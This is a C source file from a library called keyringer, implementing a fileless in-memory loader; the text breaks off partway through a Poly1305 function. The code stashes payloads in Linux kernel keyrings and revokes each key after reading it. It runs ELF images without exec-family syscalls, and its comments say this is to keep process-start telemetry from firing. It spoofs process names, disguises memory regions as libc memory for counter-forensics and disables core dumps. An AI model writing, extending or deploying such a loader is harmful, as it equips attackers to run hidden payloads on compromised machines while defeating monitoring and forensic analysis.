/*
 * kr_core.c — keyringer primitives (libkeyringer).
 *
 * All the mechanics of the fileless-exec loader live here:
 *
 *   Phase 1 (kr_stash):        split (optionally sealed) wire payload
 *                              into <=30000-byte chunks and add_key(2)
 *                              them onto the session or persistent ring.
 *   Phase 2 (kr_load_revoke):  re-find the chunks (session ring, falling
 *                              back to the persistent ring), keyctl(READ)
 *                              each one, revoke each key immediately
 *                              after its read completes.
 *   Phase 3 (kr_exec_image):   validate + map the ELF, build a fresh
 *                              process-start stack, spoof the
 *                              process name, switch sp and jump.
 *                              (kr_opts::raw skips ELF handling and
 *                              jumps into one RWX region instead.)
 *                              With kr_opts::clone_child the staged
 *                              image instead runs in a clone() child
 *                              (the v2.2 concurrency primitive; see the
 *                              allowlist note below) and the parent
 *                              returns the child's exit status.
 *   --call (kr_call_symbol):   relocate a self-contained shared object
 *                              in place and call one exported function
 *                              on the normal stack. (x86-64 only.)
 *   AEAD:                      ChaCha20-Poly1305 per RFC 8439 via AF_ALG
 *                              "rfc7539(chacha20,poly1305)".
 *
 * SYSCALL ALLOWLIST: execve/execveat/memfd_create/fork are banned —
 * zero occurrences anywhere in this file. clone() is EXPLICITLY ALLOWED
 * as the documented concurrency primitive (wire v2.2 --clone / agent):
 * it creates a child that shares everything (CLONE_VM|CLONE_FS|
 * CLONE_FILES|CLONE_SIGHAND|SIGCHLD) and which only ever runs an
 * already-staged payload and terminates itself via the payload's own
 * exit_group — no exec-family syscall, so process-start telemetry never
 * fires.
 *
 * LIBRARY RULES: no exit()/abort(), no writes to stdout/stderr. All
 * failures return -1 with a diagnostic in err[]. Verbose progress goes
 * through the kr_set_log() hook only.
 */
#define _GNU_SOURCE

#include "keyringer.h"

#include <elf.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#ifdef __aarch64__
#include <sys/auxv.h>
#endif
#include <unistd.h>
#if defined(__has_include)
#if __has_include(<linux/auxvec.h>)
#include <linux/auxvec.h>
#endif
#if __has_include(<linux/if_alg.h>)
#include <linux/if_alg.h>
#endif
#if __has_include(<linux/keyctl.h>)
#include <linux/keyctl.h>
#endif
#else
#include <linux/auxvec.h>
#include <linux/if_alg.h>
#include <linux/keyctl.h>
#endif

/* ---- fallbacks for toolchains/kernels with sparse headers ---- */
#ifndef KEY_SPEC_SESSION_KEYRING
#define KEY_SPEC_SESSION_KEYRING (-3)
#endif
#ifndef KEY_SPEC_USER_KEYRING
#define KEY_SPEC_USER_KEYRING (-4)
#endif
#ifndef KEYCTL_REVOKE
#define KEYCTL_REVOKE 3
#endif
#ifndef KEYCTL_SEARCH
#define KEYCTL_SEARCH 10
#endif
#ifndef KEYCTL_READ
#define KEYCTL_READ 11
#endif
/*
 * KEYCTL_GET_PERSISTENT is 22 in the current kernel uapi (matches
 * /usr/include/linux/keyctl.h on this box; the brief's inline "16"
 * comment miscounts older commands).
 */
#ifndef KEYCTL_GET_PERSISTENT
#define KEYCTL_GET_PERSISTENT 22
#endif
#ifndef KEYCTL_SETPERM
#define KEYCTL_SETPERM 5
#endif
#ifndef KEYCTL_SET_TIMEOUT
#define KEYCTL_SET_TIMEOUT 15
#endif
#ifndef KEYCTL_UNLINK
#define KEYCTL_UNLINK 9
#endif
#ifndef KEYCTL_INVALIDATE
#define KEYCTL_INVALIDATE 21
#endif
/* prctl(2) PR_SET_VMA (Linux 5.14+, CONFIG_ANON_VMA_NAME) */
#ifndef PR_SET_VMA
#define PR_SET_VMA 0x53564d41
#endif
#ifndef PR_SET_VMA_ANON_NAME
#define PR_SET_VMA_ANON_NAME 0
#endif
#ifndef AT_NULL
#define AT_NULL 0
#endif
#ifndef AT_PHDR
#define AT_PHDR 3
#endif
#ifndef AT_PHENT
#define AT_PHENT 4
#endif
#ifndef AT_PHNUM
#define AT_PHNUM 5
#endif
#ifndef AT_PAGESZ
#define AT_PAGESZ 6
#endif
#ifndef AT_BASE
#define AT_BASE 7
#endif
#ifndef AT_ENTRY
#define AT_ENTRY 9
#endif
#ifndef AT_UID
#define AT_UID 11
#endif
#ifndef AT_EUID
#define AT_EUID 12
#endif
#ifndef AT_GID
#define AT_GID 13
#endif
#ifndef AT_EGID
#define AT_EGID 14
#endif
#ifndef AT_PLATFORM
#define AT_PLATFORM 15
#endif
#ifndef AT_HWCAP
#define AT_HWCAP 16
#endif
#ifndef AT_SECURE
#define AT_SECURE 23
#endif
#ifndef AT_RANDOM
#define AT_RANDOM 25
#endif
#ifndef AT_EXECFN
#define AT_EXECFN 31
#endif
#ifndef AT_SYSINFO_EHDR
#define AT_SYSINFO_EHDR 33
#endif
#ifndef MAP_STACK
#define MAP_STACK 0x20000
#endif
#ifndef MAP_FIXED_NOREPLACE
#define MAP_FIXED_NOREPLACE 0x100000
#endif
#ifndef PR_SET_NAME
#define PR_SET_NAME 15
#endif
#ifndef PR_SET_DUMPABLE
#define PR_SET_DUMPABLE 4
#endif
/* madvise hardening advice (madvise(2) man page values) */
#ifndef MADV_DONTDUMP
#define MADV_DONTDUMP 16
#endif
#ifndef MADV_WIPEONFORK
#define MADV_WIPEONFORK 18
#endif
/* AF_ALG uapi (linux/if_alg.h) fallbacks */
#ifndef AF_ALG
#define AF_ALG 38
#endif
#ifndef SOL_ALG
#define SOL_ALG 279
#endif
#ifndef ALG_SET_KEY
#define ALG_SET_KEY 1
#endif
#ifndef ALG_SET_IV
#define ALG_SET_IV 2
#endif
#ifndef ALG_SET_OP
#define ALG_SET_OP 3
#endif
#ifndef ALG_SET_AEAD_ASSOCLEN
#define ALG_SET_AEAD_ASSOCLEN 4
#endif
#ifndef ALG_SET_AEAD_AUTHSIZE
#define ALG_SET_AEAD_AUTHSIZE 5
#endif
#ifndef ALG_OP_DECRYPT
#define ALG_OP_DECRYPT 0
#endif
#ifndef ALG_OP_ENCRYPT
#define ALG_OP_ENCRYPT 1
#endif
#if !defined(__has_include) || !__has_include(<linux/if_alg.h>)
struct af_alg_iv {
    uint32_t ivlen;
    uint8_t  iv[];
};
struct sockaddr_alg {
    uint16_t salg_family;
    uint8_t  salg_type[14];
    uint32_t salg_feat;
    uint32_t salg_mask;
    uint8_t  salg_name[64];
};
#endif
/* libcurl option numbers (curl/curl.h), used only through dlsym */
#define KR_CURL_OPT_WRITEDATA      10001
#define KR_CURL_OPT_URL            10002
#define KR_CURL_OPT_FOLLOWLOCATION 52
#define KR_CURL_OPT_WRITEFUNCTION  20011

#define DESC_MAX      128          /* prefix + '.' + "%03u" + NUL      */
#define INTERP_GAP    0x1000000ULL /* interp base = main_base + span + gap */
#define STACK_SIZE    (8UL * 1024UL * 1024UL)
#define CLONE_STACK   (256UL * 1024UL)  /* scratch stack for clone children */
/* VMA camouflage names for anonymous regions (wire v2.2) */
#define KR_VMA_IMAGE  "[anon:libc:heap]"
#define KR_VMA_STACK  "[anon:libc:tls]"
#define KR_VMA_SCRATCH "[anon:libc:buf]"

/* x86-64 relocation types used by --call */
#define KR_R_X86_64_64       1
#define KR_R_X86_64_GLOB_DAT 6
#define KR_R_X86_64_RELATIVE 8

/* ===================================================================== */
/* logging, errors, version                                               */
/* ===================================================================== */

static void (*g_log)(const char *fmt, va_list ap);

void kr_set_log(void (*fn)(const char *fmt, va_list ap))
{
    g_log = fn;
}

/* verbose progress; suppressed when no hook is installed */
static void kr_logf(const char *fmt, ...)
    __attribute__((format(printf, 1, 2)));
static void kr_logf(const char *fmt, ...)
{
    va_list ap;

    if (!g_log)
        return;
    va_start(ap, fmt);
    g_log(fmt, ap);
    va_end(ap);
}

/* record a diagnostic and return -1, so callers can "return seterr(...)" */
static int seterr(char *err, const char *fmt, ...)
    __attribute__((format(printf, 2, 3)));
static int seterr(char *err, const char *fmt, ...)
{
    va_list ap;

    if (err) {
        va_start(ap, fmt);
        vsnprintf(err, KR_ERRSZ, fmt, ap);
        va_end(ap);
    }
    return -1;
}

const char *kr_version(void)
{
    return "keyringer core 4.0";
}

/* original process argv (for the argv-area wipe in the spoof phase) */
static int    g_pargc;
static char **g_pargv;

void kr_set_process_argv(int argc, char **argv)
{
    g_pargc = argc;
    g_pargv = argv;
}

/* ===================================================================== */
/* small utilities                                                        */
/* ===================================================================== */

static uint64_t page_size(void)
{
    static uint64_t ps;

    if (!ps) {
        long v = sysconf(_SC_PAGESIZE);

        ps = v > 0 ? (uint64_t)v : 4096;
    }
    return ps;
}

static uint64_t page_down(uint64_t x)
{
    return x & ~(page_size() - 1);
}

static uint64_t page_up(uint64_t x)
{
    return (x + page_size() - 1) & ~(page_size() - 1);
}

/*
 * Zeroize a buffer about to be released. Writes go through a volatile
 * pointer so the compiler cannot elide the stores (a plain memset()
 * before free()/munmap() is dead-store-eliminated).
 */
static inline void volatile_wipe(void *p, size_t n)
{
    volatile uint8_t *v = (volatile uint8_t *)p;

    while (n--)
        *v++ = 0;
}

/* 32 bytes as 64 lowercase hex chars + NUL */
static void hex32_encode(const uint8_t d[32], char out[KR_KEY_HEX_LEN + 1])
{
    static const char hexd[] = "0123456789abcdef";

    for (int i = 0; i < 32; i++) {
        out[i * 2] = hexd[d[i] >> 4];
        out[i * 2 + 1] = hexd[d[i] & 0x0f];
    }
    out[KR_KEY_HEX_LEN] = '\0';
}

/*
 * VMA name camouflage (wire v2.2): name an anonymous mapping via
 * prctl(PR_SET_VMA, PR_SET_VMA_ANON_NAME, addr, len, name) — strictly
 * the prctl(2) man page argument order. Cosmetic (counter-forensics:
 * payload regions masquerade as ordinary libc-named anonymous memory)
 * and strictly nonfatal: kernels without CONFIG_ANON_VMA_NAME (or
 * environments that reject the call) just keep their unnamed VMAs, the
 * errno is logged once through the hook.
 */
static int g_vma_failed;      /* log the failure only once */
static int g_vma_ok = -1;     /* cached probe result: -1 unknown, 0 no, 1 yes */

static void vma_name(void *addr, size_t len, const char *name)
{
    long r = prctl(PR_SET_VMA, (unsigned long)PR_SET_VMA_ANON_NAME,
                   (unsigned long)(uintptr_t)addr, (unsigned long)len,
                   (unsigned long)(uintptr_t)name);

    if (r == 0) {
        if (g_vma_ok == -1)
            g_vma_ok = 1;
        return;
    }
    if (!g_vma_failed) {
        g_vma_failed = 1;
        if (g_vma_ok != 1)
            g_vma_ok = 0;
        kr_logf("warning: prctl(PR_SET_VMA, ANON_NAME, %s) failed: %s "
                "(kernel without CONFIG_ANON_VMA_NAME? feature stays "
                "nonfatal)", name, strerror(errno));
    }
}

int kr_vma_probe(void)
{
    if (g_vma_ok != -1)
        return g_vma_ok;

    size_t ps = (size_t)page_size();
    uint8_t *p = mmap(NULL, ps, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (p == MAP_FAILED)
        return (g_vma_ok = 0);
    p[0] = 1;
    vma_name(p, ps, KR_VMA_SCRATCH);

    if (!g_vma_failed) {
        g_vma_ok = 1;
    } else {
        /*
         * prctl failed — re-check by hand whether ANY name made it into
         * /proc/self/maps for this range (paranoia for kernels where
         * prctl "succeeds" but naming silently does not).
         */
        g_vma_ok = 0;
        FILE *f = fopen("/proc/self/maps", "r");
        if (f) {
            char line[512];
            uintptr_t lo = (uintptr_t)p;
            while (fgets(line, sizeof line, f)) {
                uintptr_t a = 0, b = 0;
                if (sscanf(line, "%lx-%lx", &a, &b) == 2 &&
                    lo >= a && lo < b) {
                    if (strstr(line, KR_VMA_SCRATCH))
                        g_vma_ok = 1;
                    break;
                }
            }
            fclose(f);
        }
    }
    munmap(p, ps);
    return g_vma_ok;
}

/*
 * Execution hardening for an anonymous mapping: exclude it from core
 * dumps, name it (VMA camouflage), and (for mappings that stay live
 * across the exec jump) ask the kernel to wipe it across clone+fork so
 * a fresh child starts with a clean copy. NOTE (wire v2.2): with the
 * clone() concurrency path MADV_WIPEONFORK does not fire on CLONE_VM —
 * shared mappings are not copied on clone, so there is nothing to wipe;
 * it only matters for real address-space copies (fork), and the payload
 * stack is per-child anyway. madvise/prctl failures are nonfatal on
 * exotic kernels and are only reported through the log hook.
 */
static void harden_anon(void *addr, size_t len, int wipe_on_fork,
                        const char *what, const char *vma)
{
    if (madvise(addr, len, MADV_DONTDUMP) == -1)
        kr_logf("warning: madvise(%s, MADV_DONTDUMP) failed: %s",
                what, strerror(errno));
    if (wipe_on_fork && madvise(addr, len, MADV_WIPEONFORK) == -1)
        kr_logf("warning: madvise(%s, MADV_WIPEONFORK) failed: %s "
                "(pre-4.14 kernel?)", what, strerror(errno));
    if (vma)
        vma_name(addr, len, vma);
}

/*
 * Early exec hardening, applied at the top of every execution path
 * (kr_exec_image / kr_call_symbol) BEFORE the payload image exists in
 * memory: spoof the process name (as before), then stop the process
 * being dumpable so neither the payload nor any scratch buffer can be
 * harvested from coredumps. PR_SET_DUMPABLE failure is fatal.
 */
static int exec_hardening(const char *spoof, char *err)
{
    if (prctl(PR_SET_NAME, spoof, 0, 0, 0) == -1)
        kr_logf("warning: prctl(PR_SET_NAME) failed: %s", strerror(errno));
    if (prctl(PR_SET_DUMPABLE, 0, 0, 0, 0) == -1)
        return seterr(err, "exec: prctl(PR_SET_DUMPABLE, 0) failed: %s — "
                      "refusing to stage the payload", strerror(errno));
    return 0;
}

/* getrandom(2) with a /dev/urandom fallback; no exit on failure */
static int kr_random(void *buf, size_t n)
{
    if (syscall(__NR_getrandom, buf, n, 0) == (long)n)
        return 0;
    int fd = open("/dev/urandom", O_RDONLY);

    if (fd < 0)
        return -1;
    size_t got = 0;

    while (got < n) {
        ssize_t r = read(fd, (char *)buf + got, n - got);

        if (r <= 0) {
            close(fd);
            return -1;
        }
        got += (size_t)r;
    }
    close(fd);
    return 0;
}

/* 32 bytes from 64 hex chars */
static int hex32(const char *hex, uint8_t out[32], char *err)
{
    if (!hex || strlen(hex) != KR_KEY_HEX_LEN)
        return seterr(err, "key must be exactly %d hex chars", KR_KEY_HEX_LEN);
    for (size_t i = 0; i < 32; i++) {
        unsigned v = 0;

        for (int nib = 0; nib < 2; nib++) {
            char c = hex[i * 2 + nib];

            v <<= 4;
            if (c >= '0' && c <= '9')
                v |= (unsigned)(c - '0');
            else if (c >= 'a' && c <= 'f')
                v |= (unsigned)(c - 'a') + 10u;
            else if (c >= 'A' && c <= 'F')
                v |= (unsigned)(c - 'A') + 10u;
            else
                return seterr(err, "key is not hex (char '%c' at offset %zu)",
                              c, i * 2 + (size_t)nib);
        }
        out[i] = (uint8_t)v;
    }
    return 0;
}

/* read a whole file into a malloc'd buffer (library-safe, no exit) */
static int kr_read_file(const char *path, void **out, size_t *out_len, char *err)
{
    int fd = open(path, O_RDONLY);
    struct stat st;
    size_t cap, len = 0;
    uint8_t *buf;

    *out = NULL;
    *out_len = 0;
    if (fd < 0)
        return seterr(err, "open %s: %s", path, strerror(errno));
    if (fstat(fd, &st) == 0 && st.st_size > 0)
        cap = (size_t)st.st_size + 1;
    else
        cap = 65536;
    buf = malloc(cap);
    if (!buf) {
        close(fd);
        return seterr(err, "out of memory");
    }
    for (;;) {
        ssize_t r;

        if (len == cap) {
            uint8_t *nb;

            cap *= 2;
            nb = realloc(buf, cap);
            if (!nb) {
                free(buf);
                close(fd);
                return seterr(err, "out of memory");
            }
            buf = nb;
        }
        r = read(fd, buf + len, cap - len);
        if (r < 0) {
            int e = errno;

            free(buf);
            close(fd);
            return seterr(err, "read %s: %s", path, strerror(e));
        }
        if (r == 0)
            break;
        len += (size_t)r;
    }
    close(fd);
    *out = buf;
    *out_len = len;
    return 0;
}

/* single auxv entry of this process, read from /proc/self/auxv
 * (x86-64 only: the arm64 build reads the guest auxv via getauxval) */
#ifndef __aarch64__
static uint64_t auxv_get(uint64_t type)
{
    FILE *f = fopen("/proc/self/auxv", "rb");
    uint64_t val = 0;

    if (!f)
        return 0;
    uint64_t pair[2];

    while (fread(pair, sizeof pair, 1, f) == 1) {
        if (pair[0] == type) {
            val = pair[1];
            break;
        }
        if (pair[0] == AT_NULL)
            break;
    }
    fclose(f);
    return val;
}
#endif

/* ===================================================================== */
/* Portable userspace crypto: SHA-256, HMAC-SHA256, HKDF,                 */
/* ChaCha20-Poly1305 — FIPS 180-2 / RFC 6234 / 5869 / 8439 reference      */
/* implementations.  These are the FALLBACK path for kernels without      */
/* working AF_ALG (modular user-api, old kernels, hardened builds): the   */
/* tool runs on any Linux with the keyring syscalls, using the kernel's   */
/* crypto when it is there (preferred: faster, and keeps the "kernel      */
/* does the crypto" property) and these references otherwise.  All four   */
/* are pinned by KAT vectors in kr_selftest (RFC 8439 2.8.2, FIPS "abc",  */
/* RFC 4231 case 1, RFC 5869 case 1), and the twin's pure-Python RFC      */
/* 8439 implementation cross-checks the AEAD interop.                     */
/* ===================================================================== */

/* ---- SHA-256 (FIPS 180-2) -------------------------------------------- */

typedef struct {
    uint32_t h[8];
    uint64_t len;
    uint8_t  buf[64];
    size_t   buflen;
} kr_sha256_ctx;

static const uint32_t KR_SHA_K[64] = {
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,
    0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,
    0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,
    0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,
    0x06ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,
    0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,0xa2bfe8a1,0xa81a664b,
    0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,
    0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,
    0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
};

static uint32_t kr_ror(uint32_t x, int n) { return (x >> n) | (x << (32 - n)); }
static uint32_t kr_rol(uint32_t x, int n) { return (x << n) | (x >> (32 - n)); }

static void kr_sha256_init(kr_sha256_ctx *c)
{
    c->h[0] = 0x6a09e667; c->h[1] = 0xbb67ae85;
    c->h[2] = 0x3c6ef372; c->h[3] = 0xa54ff53a;
    c->h[4] = 0x510e527f; c->h[5] = 0x9b05688c;
    c->h[6] = 0x1f83d9ab; c->h[7] = 0x5be0cd19;
    c->len = 0;
    c->buflen = 0;
}

static void kr_sha256_block(kr_sha256_ctx *c, const uint8_t *p)
{
    uint32_t w[64], a, b, cc, d, e, f, g, h;
    int i;

    for (i = 0; i < 16; i++)
        w[i] = ((uint32_t)p[i*4] << 24) | ((uint32_t)p[i*4+1] << 16) |
               ((uint32_t)p[i*4+2] << 8) | (uint32_t)p[i*4+3];
    for (i = 16; i < 64; i++) {
        uint32_t s0 = kr_ror(w[i-15], 7) ^ kr_ror(w[i-15], 18) ^ (w[i-15] >> 3);
        uint32_t s1 = kr_ror(w[i-2], 17) ^ kr_ror(w[i-2], 19) ^ (w[i-2] >> 10);
        w[i] = w[i-16] + s0 + w[i-7] + s1;
    }
    a = c->h[0]; b = c->h[1]; cc = c->h[2]; d = c->h[3];
    e = c->h[4]; f = c->h[5]; g = c->h[6]; h = c->h[7];
    for (i = 0; i < 64; i++) {
        uint32_t S1 = kr_ror(e, 6) ^ kr_ror(e, 11) ^ kr_ror(e, 25);
        uint32_t ch = (e & f) ^ (~e & g);
        uint32_t t1 = h + S1 + ch + KR_SHA_K[i] + w[i];
        uint32_t S0 = kr_ror(a, 2) ^ kr_ror(a, 13) ^ kr_ror(a, 22);
        uint32_t maj = (a & b) ^ (a & cc) ^ (b & cc);
        uint32_t t2 = S0 + maj;
        h = g; g = f; f = e; e = d + t1;
        d = cc; cc = b; b = a; a = t1 + t2;
    }
    c->h[0] += a; c->h[1] += b; c->h[2] += cc; c->h[3] += d;
    c->h[4] += e; c->h[5] += f; c->h[6] += g; c->h[7] += h;
}

static void kr_sha256_update(kr_sha256_ctx *c, const uint8_t *p, size_t n)
{
    c->len += (uint64_t)n;
    while (n) {
        size_t take = 64 - c->buflen < n ? 64 - c->buflen : n;

        memcpy(c->buf + c->buflen, p, take);
        c->buflen += take;
        p += take;
        n -= take;
        if (c->buflen == 64) {
            kr_sha256_block(c, c->buf);
            c->buflen = 0;
        }
    }
}

static void kr_sha256_final(kr_sha256_ctx *c, uint8_t out[32])
{
    uint64_t bits = c->len * 8;
    uint8_t pad = 0x80;
    int i;

    kr_sha256_update(c, &pad, 1);
    pad = 0;
    while (c->buflen != 56)
        kr_sha256_update(c, &pad, 1);
    for (i = 7; i >= 0; i--) {
        uint8_t b = (uint8_t)(bits >> (i * 8));

        kr_sha256_update(c, &b, 1);
    }
    for (i = 0; i < 8; i++) {
        out[i*4]   = (uint8_t)(c->h[i] >> 24);
        out[i*4+1] = (uint8_t)(c->h[i] >> 16);
        out[i*4+2] = (uint8_t)(c->h[i] >> 8);
        out[i*4+3] = (uint8_t)c->h[i];
    }
}

static void sha256_ref(const uint8_t *data, size_t len, uint8_t out[32])
{
    kr_sha256_ctx c;

    kr_sha256_init(&c);
    kr_sha256_update(&c, data, len);
    kr_sha256_final(&c, out);
}

/* ---- HMAC-SHA256 (RFC 2104) ------------------------------------------- */

static void hmac_sha256_ref(const uint8_t *key, size_t keylen,
                            const uint8_t *data, size_t len, uint8_t out[32])
{
    uint8_t k[32], ip[64], op[64], ksum[32];
    kr_sha256_ctx c;
    int i;

    if (keylen > 64) {
        sha256_ref(key, keylen, ksum);
        memcpy(k, ksum, 32);
    } else {
        memset(k, 0, 32);
        memcpy(k, key, keylen);
    }
    for (i = 0; i < 64; i++) {
        ip[i] = k[i < 32 ? i : 0] ^ 0x36;
        op[i] = k[i < 32 ? i : 0] ^ 0x5c;
    }
    memset(ip + 32, 0x36, 32);
    memset(op + 32, 0x5c, 32);
    kr_sha256_init(&c);
    kr_sha256_update(&c, ip, 64);
    kr_sha256_update(&c, data, len);
    {
        uint8_t inner[32];

        kr_sha256_final(&c, inner);
        kr_sha256_init(&c);
        kr_sha256_update(&c, op, 64);
        kr_sha256_update(&c, inner, 32);
        kr_sha256_final(&c, out);
    }
}

/* ---- HKDF-SHA256 (RFC 5869) ------------------------------------------- */

static void hkdf_sha256_ref(const uint8_t *ikm, size_t ikmlen,
                            const uint8_t *salt, size_t saltlen,
                            const uint8_t *info, size_t infolen,
                            uint8_t *okm, size_t L)
{
    uint8_t prk[32];
    uint8_t t[32];
    size_t tlen = 0, done = 0;
    uint8_t counter = 1;

    if (!salt || !saltlen) {
        static const uint8_t zeros[32] = { 0 };
        salt = zeros;
        saltlen = 32;
    }
    hmac_sha256_ref(salt, saltlen, ikm, ikmlen, prk);
    while (done < L) {
        uint8_t block[32];
        size_t take;
        /* T(i) = HMAC(prk, T(i-1) || info || i) — HMAC-keyed by prk */
        uint8_t *msg = malloc(tlen + infolen + 1);

        if (!msg)
            return;
        memcpy(msg, t, tlen);
        memcpy(msg + tlen, info, infolen);
        msg[tlen + infolen] = counter;
        hmac_sha256_ref(prk, 32, msg, tlen + infolen + 1, block);
        free(msg);
        memcpy(t, block, 32);
        tlen = 32;
        take = L - done < 32 ? L - done : 32;

        memcpy(okm + done, t, take);
        done += take;
        counter++;
    }
}

/* ---- ChaCha20-Poly1305 (RFC 8439) -------------------------------------- */

static void kr_le32enc(uint8_t *p, uint32_t v)
{
    p[0] = (uint8_t)v; p[1] = (uint8_t)(v >> 8);
    p[2] = (uint8_t)(v >> 16); p[3] = (uint8_t)(v >> 24);
}

static uint32_t kr_le32dec(const uint8_t *p)
{
    return (uint32_t)p[0] | ((uint32_t)p[1] << 8) |
           ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

static void kr_chacha20_block(const uint8_t key[32], uint32_t counter,
                              const uint8_t nonce[12], uint8_t out[64])
{
    static const char sigma[16] = "expand 32-byte k";
    uint32_t st[16], x[16];
    int i;

    st[0] = kr_le32dec((const uint8_t *)sigma);
    st[1] = kr_le32dec((const uint8_t *)sigma + 4);
    st[2] = kr_le32dec((const uint8_t *)sigma + 8);
    st[3] = kr_le32dec((const uint8_t *)sigma + 12);
    for (i = 0; i < 8; i++)
        st[4 + i] = kr_le32dec(key + i * 4);
    st[12] = counter;
    st[13] = kr_le32dec(nonce);
    st[14] = kr_le32dec(nonce + 4);
    st[15] = kr_le32dec(nonce + 8);
    memcpy(x, st, sizeof st);
#define KR_QR(a, b, c, d) do { \
        x[a] += x[b]; x[d] ^= x[a]; x[d] = kr_rol(x[d], 16); \
        x[c] += x[d]; x[b] ^= x[c]; x[b] = kr_rol(x[b], 12); \
        x[a] += x[b]; x[d] ^= x[a]; x[d] = kr_rol(x[d], 8);  \
        x[c] += x[d]; x[b] ^= x[c]; x[b] = kr_rol(x[b], 7);  \
    } while (0)
    for (i = 0; i < 10; i++) {
        KR_QR(0, 4, 8, 12); KR_QR(1, 5, 9, 13); KR_QR(2, 6, 10, 14); KR_QR(3, 7, 11, 15);
        KR_QR(0, 5, 10, 15); KR_QR(1, 6, 11, 12); KR_QR(2, 7, 8, 13); KR_QR(3, 4, 9, 14);
    }
#undef KR_QR
    for (i = 0; i < 16; i++)
        kr_le32enc(out + i * 4, x[i] + st[i]);
}

static void kr_poly1305_mac(const uint8_t key[32],
                            const uint8_t *m, size_t bytes, uint8_t tag[16])
{
    uint32_t r[5], h[5], pad[4];
    size_t i;

    /* r = clamp(le32 key[0..16)); pad = le32 key[16..32) */
    {
        uint8_t rk[32];

        memcpy(rk, key, 32);
        rk[3]  &= 15; rk[7]  &= 15; rk[11] &= 15; rk[15] &= 15;
        rk[4]  &= 252; rk[8] &= 252; rk[12] &= 252;
        r[0] =  kr_le32dec(rk)       & 0x3ffffff;
        r[1] = (kr_le32dec(rk +  3) >>  2) & 0x3ffff03;
        r[2] = (kr_le32dec(rk +  6) >>  4) & 0x3ffc0ff;
        r[3] = (kr_le32dec(rk +  9) >>  6) & 0x3f03fff;
        r[4] = (kr_le32dec(rk + 12) >>  8) & 0x00fffff;
        for (i = 0; i < 4; i++)
            pad[i] = kr_le32dec(key + 16 + i * 4);
    }
    h[0] = h[1] = h[2] = h[3] = h[4] = 0;

    while (bytes >= 16) {
        uint64_t d0, d1, d2, d3, d4, cc;

        h[0] += (d0 = kr_le32dec(m))       & 0x3ffffff;
        h[1] += (d1 = kr_le32dec(m +  3) >>  2) & 0x3ffffff;
        h[2] += (d2 = kr_le32dec(m +  6) >>  4) & 0x3ffffff;
        h[3] += (d3 = kr_le32dec(m +  9) >>  6) & 0x3ffffff;
        h[4] += (d4 = kr_le32dec(m + 12) >>  8) | (1UL << 24);

        d0 = (uint64_t)h[0] * r[0] + (uint64_t)h[1] * (r[4] * 5) +
             (uint64_t)h[2] * (r[3] * 5) + (uint64_t)h[3] * (r[2] * 5) +
             (uint64_t)h[4] * (r[1] * 5);
        d1 = (uint64_t)h[0] * r[1] + (uint64_t)h[1] * r[0] +
             (uint64_t)h[2] * (r[4] * 5) + (uint64_t)h[3] * (r[3] * 5) +
             (uint64_t)h[4] * (r[2] * 5);
        d2 = (uint64_t)h[0] * r[2] + (uint64_t)h[1] * r[1] +
             (uint64_t)h[2] * r[0] + (uint64_t)h[3] * (r[4] * 5) +
             (uint64_t)h[4] * (r[3] * 5);
        d3 = (uint64_t)h[0] * r[3] + (uint64_t)h[1] * r[2] +
             (uint64_t)h[2] * r[1] + (uint64_t)h[3] * r[0] +
             (uint64_t)h[4] * (r[4] * 5);
        d4 = (uint64_t)h[0] * r[4] + (uint64_t)h[1] * r[3] +
             (uint64_t)h[2] * r[2] + (uint64_t)h[3] * r[1] +
             (uint64_t)h[4] * r[0];

        cc = d0 >> 26; h[0] = (uint32_t)d0 & 0x3ffffff;
        d1 += cc; cc = d1 >> 26; h[1] = (uint32_t)d1 & 0x3ffffff;
        d2 += cc; cc = d2 >> 26; h[2] = (uint32_t)d2 & 0x3ffffff;
        d3 += cc; cc = d3 >> 26; h[3] = (uint32_t)d3 & 0x3ffffff;
        d4 += cc; cc = d4 >> 26; h[4] = (uint32_t)d4 & 0x3ffffff;
        h[0] += (uint32_t)cc * 5; cc = h[0] >> 26; h[0] &= 0x3ffffff;
        h[1] += (uint32_t)cc;

        m += 16;
        bytes -= 16;
    }
    if (bytes) {
        uint8_t block[16];
        uint64_t d0, d1, d2, d3, d4, cc;

        memcpy(block, m, bytes);
        block[bytes] = 1;                 /* the appended 1 bit */
        if (bytes < 15)
            memset(block + bytes + 1, 0, 15 - bytes);

        h[0] += kr_le32dec(block)       & 0x3ffffff;
        h[1] += (kr_le32dec(block +  3) >>  2) & 0x3ffffff;
        h[2] += (kr_le32dec(block +  6) >>  4) & 0x3ffffff;
        h[3] += (kr_le32dec(block +  9) >>  6) & 0x3ffffff;
        h[4] +=  kr_le32dec(block + 12) >>  8;   /* bit carried in data */

        /* same multiply as above */
        d0 = (uint64_t)h[0] * r[0] + (uint64_t)h[1] * (r[4] * 5) +
             (uint64_t)h[2] * (r[3] * 5) + (uint64_t)h[3] * (r[2] * 5) +
             (uint64_t)h[4] * (r[1] * 5);
        d1 = (uint64_t)h[0] * r[1] + (uint64_t)h[1] * r[0] +
             (uint64_t)h[2] * (r[4] * 5) + (uint64_t)h[3] * (r[3] * 5) +
             (uint64_t)h[4] * (r[2] * 5);
        d2 = (uint64_t)h[0] * r[2] + (uint64_t)h[1] * r[1] +
